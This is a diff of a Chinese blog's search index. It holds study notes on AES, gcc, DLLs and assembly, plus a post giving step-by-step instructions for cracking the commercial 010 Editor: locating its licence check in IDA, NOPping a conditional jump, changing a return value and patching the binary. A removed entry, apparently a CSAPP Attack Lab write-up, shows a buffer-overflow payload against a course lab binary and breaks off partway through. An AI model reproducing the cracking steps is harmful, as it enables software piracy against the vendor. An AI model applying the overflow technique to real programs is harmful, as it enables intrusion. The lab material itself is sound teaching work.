-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181034.png"></p>
-<p>S-box不是固定不变的，也就是说S-box部分可以被魔改，但是不能随意更改，要符合S-box的设计规范。</p>
-<h4 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h4><p>矩阵第一行不变，第二行左移一个字节，第三行左移两个字节，第三行左移三个字节</p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181615.png"></p>
-<h4 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h4><p>将输入矩阵<strong>左乘</strong>一个给定的4*4矩阵，但是这里的矩阵相乘的<strong>加</strong>和<strong>乘</strong>的规则不同于我们在线代课上接触的。</p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803181829.png"></p>
-<h5 id="加和乘规则"><a href="#加和乘规则" class="headerlink" title="加和乘规则"></a>加和乘规则</h5><p>简单来讲把<strong>加</strong>替换为了<strong>异或</strong>操作<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200828.png"></p>
-<p>对于<strong>乘法</strong>，我们就将其规则记作下面的 ” · “再mod上m(x)吧！！！因为是在有限域2^8中，所以最终的结果不能存在大于等于八的次数<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803235059.png"></p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803205004.png"></p>
-<p>经过列混合得到<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803205352.png"></p>
-<h4 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h4><p>将得到的矩阵与<strong>子密钥矩阵</strong>进行异或 </p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803182348.png"></p>
-<h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>上述的过程所提及的密钥都是子密钥矩阵，子密钥矩阵是初始密钥矩阵通过密钥扩展得到的，密钥矩阵经密钥扩展得到十个子密钥矩阵，运用到十次加密中（九轮循环+最终轮）<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803184432.png"></p>
-<p>前四列是初始的，后面的都是计算得来的，计算时讨论下标是不是4的倍数。</p>
-<p><strong>T函数</strong> ：字循环、字节代换、轮常量异或</p>
-<p>字循环：将一列的四个字节循环左移一个字节如【b0,b1,b2,b3】–&gt;【b1,b2,b3,b0】</p>
-<p>字节代换：查S盒进行代换</p>
-<p>轮常量异或：给定10列常量。将前两步得到的结果与轮常量Rcon[j]进行异或，j表示轮数。轮常量数组中的每一个元素为一个32位的双字，且低24位恒为0.高八位（1字节）按如下规则定义：Rcon[1]&#x3D;1,Rcon[i]&#x3D;2*Rcon[i-1]<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200147.png"></p>
-<p>重复扩展过程得到全部的子密钥矩阵<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803200329.png"></p>
-<h2 id="算法特征"><a href="#算法特征" class="headerlink" title="算法特征"></a>算法特征</h2><p>128位（16字节）一组、S-box、列混合、行移位等过程</p>
-<p>可以进行<strong>魔改</strong>的部分：S-box、列混合、轮密钥加、行移位等过程的顺序可以进行调整。</p>
-]]></content>
-      <tags>
-        <tag>密码学</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>gcc常用命令</title>
     <url>/2023/08/18/gcc%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
     <content><![CDATA[<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p><strong>1.<strong>首先是最常用的，</strong>源文件生成可执行文件</strong></p>
@@ -1117,6 +1234,24 @@
       <tags>
         <tag>gcc</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2022/12/18/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h2 id><a href="#" class="headerlink" title></a><span id="more"></span></h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a><!--more--></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
   </entry>
   <entry>
     <title>动态链接库（DLL）及其工作原理</title>
@@ -1175,49 +1310,6 @@
       <tags>
         <tag>DLL</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>破解010Editor</title>
-    <url>/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/</url>
-    <content><![CDATA[<p>刚开始学安全的时候，以为逆向就是软件破解hhh，学习了也有段时间了，挑个软柿子捏捏吧。</p>
-<p>去官网按照自己的需求下载</p>
-<span id="more"></span>![](破解010Editor/QQ截图20230730115114.png)
-
-<p>我是win64</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730115747.png"></p>
-<p>不知道什么原因哈，我这个一打开是这样的，应为是破解完才写的博客，这个是我重新下载的一个，看这个名字和密码也是我之前随便输入的，不重要，直接上ida。</p>
-<p>直接字符串搜索，就搜索下面的文本就行“thank you”<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120246.png"></p>
-<p>双击之后x交叉引用<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120302.png"></p>
-<p>进入了流程图界面，按一下tab即可进入伪代码界面，代码不多，翻找一下即可找到<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120429.png"></p>
-<p>也就是v17只要满足这个判断就说明我们成功了。什么？你问为什么？</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120606.png"></p>
-<p>现在知道了吧hhh找到最近的v17点进去看看<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120710.png"></p>
-<p>我们只要使这个函数的返回值等于219即可，进入之后我们可以看到很多判断和ruturn<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120814.png"></p>
-<p>查看流程图更加明了一点</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121003.png"></p>
-<p>直接从头开始，jz代表的是判断为0则跳转	，对应的就是这里<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121106.png"></p>
-<p>最简单的就是去掉这个判断条件，直接让他return然后把return的值修改一下即可。按空格进入汇编页面，选中jz那里（要多选择一行）然后右键点击fill with nops就行啦</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121528.png"></p>
-<p>修改之后整个函数就变得简单啦<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121710.png"></p>
-<p>再次查看刚在那个有很多return的函数发现变成这样了<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121753.png"></p>
-<p>然后我们将这个275修改成219</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121935.png"></p>
-<p>就ok啦。最后edit–&gt;patch program –&gt;apply patch to input file</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122208.png"></p>
-<p>出现了一个permisson denied，拒绝访问，查了一下多是linux系统中权限的问题，好像换一个盘符也可以解决，我摸索了一下，直接将刚才下载的010Editor.exe复制到别的地方，不在原来的目录即可</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122808.png"></p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122841.png"></p>
-<p>然后这里的地址修改一下<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122912.png"></p>
-<p>出现<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122558.png"></p>
-<p>这个就算大功告成啦</p>
-<p>然后将这个更改后的程序复制到之前的目录，选择替换即可<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123134.png"></p>
-<p>点击help –&gt; about 随意输入即可</p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123059.png"></p>
-<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123105.png"></p>
-<p>其是毫无难度，应该也可以找到加密函数写注册机啥的。其实感觉这一年的学习下来，学会的最重要的技能就是使用搜索引擎了，遇到什么问题都不至于太慌乱，可以想象，要是之前的我遇到种种报错和权限问题肯定慌得不行，现在第一反应就是取edge一下，再不行就Google一下，再不行就问一下学长。加油！！！</p>
-<p>参考：</p>
-<p><a href="https://www.bilibili.com/read/cv12423453/">https://www.bilibili.com/read/cv12423453/</a></p>
-]]></content>
   </entry>
   <entry>
     <title>汇编语言</title>
@@ -1484,6 +1576,49 @@
       <tags>
         <tag>汇编</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>破解010Editor</title>
+    <url>/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/</url>
+    <content><![CDATA[<p>刚开始学安全的时候，以为逆向就是软件破解hhh，学习了也有段时间了，挑个软柿子捏捏吧。</p>
+<p>去官网按照自己的需求下载</p>
+<span id="more"></span>![](破解010Editor/QQ截图20230730115114.png)
+
+<p>我是win64</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730115747.png"></p>
+<p>不知道什么原因哈，我这个一打开是这样的，应为是破解完才写的博客，这个是我重新下载的一个，看这个名字和密码也是我之前随便输入的，不重要，直接上ida。</p>
+<p>直接字符串搜索，就搜索下面的文本就行“thank you”<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120246.png"></p>
+<p>双击之后x交叉引用<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120302.png"></p>
+<p>进入了流程图界面，按一下tab即可进入伪代码界面，代码不多，翻找一下即可找到<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120429.png"></p>
+<p>也就是v17只要满足这个判断就说明我们成功了。什么？你问为什么？</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120606.png"></p>
+<p>现在知道了吧hhh找到最近的v17点进去看看<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120710.png"></p>
+<p>我们只要使这个函数的返回值等于219即可，进入之后我们可以看到很多判断和ruturn<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730120814.png"></p>
+<p>查看流程图更加明了一点</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121003.png"></p>
+<p>直接从头开始，jz代表的是判断为0则跳转	，对应的就是这里<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121106.png"></p>
+<p>最简单的就是去掉这个判断条件，直接让他return然后把return的值修改一下即可。按空格进入汇编页面，选中jz那里（要多选择一行）然后右键点击fill with nops就行啦</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121528.png"></p>
+<p>修改之后整个函数就变得简单啦<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121710.png"></p>
+<p>再次查看刚在那个有很多return的函数发现变成这样了<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121753.png"></p>
+<p>然后我们将这个275修改成219</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730121935.png"></p>
+<p>就ok啦。最后edit–&gt;patch program –&gt;apply patch to input file</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122208.png"></p>
+<p>出现了一个permisson denied，拒绝访问，查了一下多是linux系统中权限的问题，好像换一个盘符也可以解决，我摸索了一下，直接将刚才下载的010Editor.exe复制到别的地方，不在原来的目录即可</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122808.png"></p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122841.png"></p>
+<p>然后这里的地址修改一下<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122912.png"></p>
+<p>出现<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730122558.png"></p>
+<p>这个就算大功告成啦</p>
+<p>然后将这个更改后的程序复制到之前的目录，选择替换即可<img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123134.png"></p>
+<p>点击help –&gt; about 随意输入即可</p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123059.png"></p>
+<p><img src="/2023/07/30/%E7%A0%B4%E8%A7%A3010Editor/QQ%E6%88%AA%E5%9B%BE20230730123105.png"></p>
+<p>其是毫无难度，应该也可以找到加密函数写注册机啥的。其实感觉这一年的学习下来，学会的最重要的技能就是使用搜索引擎了，遇到什么问题都不至于太慌乱，可以想象，要是之前的我遇到种种报错和权限问题肯定慌得不行，现在第一反应就是取edge一下，再不行就Google一下，再不行就问一下学长。加油！！！</p>
+<p>参考：</p>
+<p><a href="https://www.bilibili.com/read/cv12423453/">https://www.bilibili.com/read/cv12423453/</a></p>
+]]></content>
   </entry>
   <entry>
     <title>第八章-异常控制流</title>
@@ -1818,140 +1953,5 @@
 <p>将二进制(机器码)翻译成高级语言，我们可以再套一层虚拟机，将我们的c语言转变成这个汇编。通过这次虚拟机的实现过程，对计算机行为有了更进一步的了解。</p>
 <p><a href="https://www.jmeiners.com/lc3-vm/"><a href="https://www.jmeiners.com/lc3-vm/">Write your Own Virtual Machine (jmeiners.com)</a></a></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>Attack_lab</title>
-    <url>/2023/08/26/Attack-lab/</url>
-    <content><![CDATA[<p>这个实验非常有意思，了解一下缓冲区溢出相关的知识就可以开始了。</p>
-<p>​                                                        !  ^_^ !</p>
-<span id="more"></span>
-
-<p><strong>文件信息：</strong></p>
-<p>argetk中的文件包括:<br>README.txt：描述目录内容的文件<br>ctarget：易受代码注入攻击的可执行程序<br>rtarget：易受面向返回编程攻击的可执行程序<br>cookie.txt：8位十六进制代码，您将在攻击中使用它作为唯一标识符。<br>farm.c：目标“gadget farm”的源代码，您将使用它生成面向返回的编程攻击。<br>hex2raw：生成攻击字符串的实用程序。</p>
-<p><a href="https://blog.csdn.net/weixin_43362650/article/details/121084611">《深入理解计算机系统》实验三Attack Lab下载和官方文档机翻_Addyz的博客-CSDN博客</a></p>
-<p>看官方文档说是要以csapp3.10.3–3.10.4作为参考，这两个小节主要讲了<strong>缓冲区溢出</strong>和保护机制。</p>
-<h3 id="缓冲区溢出："><a href="#缓冲区溢出：" class="headerlink" title="缓冲区溢出："></a>缓冲区溢出：</h3><h3 id="对抗缓冲区溢出攻击："><a href="#对抗缓冲区溢出攻击：" class="headerlink" title="对抗缓冲区溢出攻击："></a>对抗缓冲区溢出攻击：</h3><h4 id="栈随机化："><a href="#栈随机化：" class="headerlink" title="栈随机化："></a>栈随机化：</h4><p>栈的位置每次运行都有变化，因此很多地址不能确定，代码不能实现跳转。实现的方法是在程序开始时，在栈上分配一段0~n字节之间随机大小的空间。</p>
-<h4 id="金丝雀值-canary"><a href="#金丝雀值-canary" class="headerlink" title="金丝雀值(canary):"></a>金丝雀值(canary):</h4><p>在栈的缓冲区开始的位置填充一个值，每次函数调用这个数值要和数据段中的一个不可更改的值进行比较，一旦发生缓冲区溢出，cannary值就会发生变化，从而结束程序。</p>
-<h4 id="限制可执行代码区域："><a href="#限制可执行代码区域：" class="headerlink" title="限制可执行代码区域："></a>限制可执行代码区域：</h4><p>栈空间被设置为不可执行属性，所以不能直接在输入的字符中创建shellcode，要通过rop才能实行攻击。</p>
-<h3 id="实验部分1代码注入攻击："><a href="#实验部分1代码注入攻击：" class="headerlink" title="实验部分1代码注入攻击："></a>实验部分1代码注入攻击：</h3><h4 id="Level1"><a href="#Level1" class="headerlink" title="Level1:"></a>Level1:</h4><p>test 调用完getbuf，使getbuf 返回执行touch1 而不是返回test 。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch1!:You called touch1()\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对应的汇编内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017c0 &lt;touch1&gt;:</span><br><span class="line">  4017c0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017cb:	00 00 00 </span><br><span class="line">  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi</span><br><span class="line">  4017d3:	e8 e8 f4 ff ff       	call   400cc0 &lt;puts@plt&gt;</span><br><span class="line">  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  4017dd:	e8 ab 04 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  4017e7:	e8 54 f6 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>我们只要确定存放返回地址的位置，将其覆盖成4017c0即可。可以看到调用getbuf之后，sub    $0x28,%rsp，创建了0x28字节的缓冲区域，返回地址位于栈底，第一个字符距离栈底28个字节，我们只要输入一串长度为32字节的字符，前二十八个任意填充，后四个按照小端序填充touch1的地址c0 17 40 00即可。</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> </span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">c0</span> <span class="number">17</span> <span class="number">40</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230824122941.png"></p>
-<p>正确的姿势是将16进制数据写入flag1.txt然后使用题目中给出的16进制转字符串工具&gt;flag01.txt,然后将flag01.txt作为参数传入。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; flag1.txt  &gt; input1.txt</span><br></pre></td></tr></table></figure>
-
-<p>注意这里的&lt; 和 &gt;不是括号，而是指向，将flag1.txt传入hex，其输出结果写入input1.txt</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./ctarget -q -i flag01.txt</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>-q选项是不连接网络 （不加此选项会报错）</li>
-<li>-i 是 以文件作为输入</li>
-</ul>
-<h4 id="Level2："><a href="#Level2：" class="headerlink" title="Level2："></a>Level2：</h4><p>test调用getbuf，并返回touch2，和level1的不同在于touch2需要参数，函数的第一个参数是存放在rdi寄存器中的。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No exploit.Getbuf returned 0x%x\n&quot;</span>,val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line">    vlevel=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val==cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Touch2!:You called touche2(0x%.8x)&quot;</span>,val);</span><br><span class="line">        validate(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Misfire:You called touch2(0x%.8x)\n&quot;</span>,val);</span><br><span class="line">        fail(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对应的汇编内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line">  4017b9:	48 83 c4 28          	add    $0x28,%rsp</span><br><span class="line">  4017bd:	c3                   	ret    </span><br><span class="line">  4017be:	90                   	nop</span><br><span class="line">  4017bf:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  0000000000401968 &lt;test&gt;:</span><br><span class="line">  401968:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  40196c:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401971:	e8 32 fe ff ff       	call   4017a8 &lt;getbuf&gt;         # push IP ; jmp getbuf</span><br><span class="line">  401976:	89 c2                	mov    %eax,%edx</span><br><span class="line">  401978:	be 88 31 40 00       	mov    $0x403188,%esi</span><br><span class="line">  40197d:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401982:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401987:	e8 64 f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  40198c:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401990:	c3                   	ret    </span><br><span class="line">  401991:	90                   	nop</span><br><span class="line">  </span><br><span class="line">  00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4017f0:	89 fa                	mov    %edi,%edx</span><br><span class="line">  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt; vlevel=2;</span><br><span class="line">  4017f9:	00 00 00 </span><br><span class="line">  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;   if(val==cookie)</span><br><span class="line">  401802:	75 20                	jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:	be e8 30 40 00       	mov    $0x4030e8,%esi</span><br><span class="line">  401809:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40180e:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401813:	e8 d8 f5 ff ff       	call   400df0 